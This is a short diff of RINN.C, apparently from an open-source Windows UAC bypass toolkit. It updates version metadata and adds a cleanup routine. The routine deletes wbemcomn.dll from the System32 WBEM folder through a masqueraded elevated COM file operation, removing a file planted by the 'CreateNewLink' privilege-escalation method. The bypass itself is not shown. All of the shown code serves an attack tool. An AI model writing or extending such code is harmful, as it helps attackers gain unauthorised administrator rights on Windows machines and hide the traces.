@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2018 - 2019
 *
 *  TITLE:       RINN.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Aug 2018
+*  DATE:        17 Mar 2019
 *
 *  rinn UAC bypass using CreateNewLink interface.
 *
@@ -17,6 +17,28 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+/*
+* ucmCreateNewLinkMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine for CreateNewLinkMethod.
+*
+*/
+
+BOOL ucmCreateNewLinkMethodCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szSystemDirectory);
+    _strcat(szBuffer, WBEM_DIR);
+    _strcat(szBuffer, WBEMCOMN_DLL);
+
+    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+}
 
 /*
 * ucmCreateNewLinkMethod
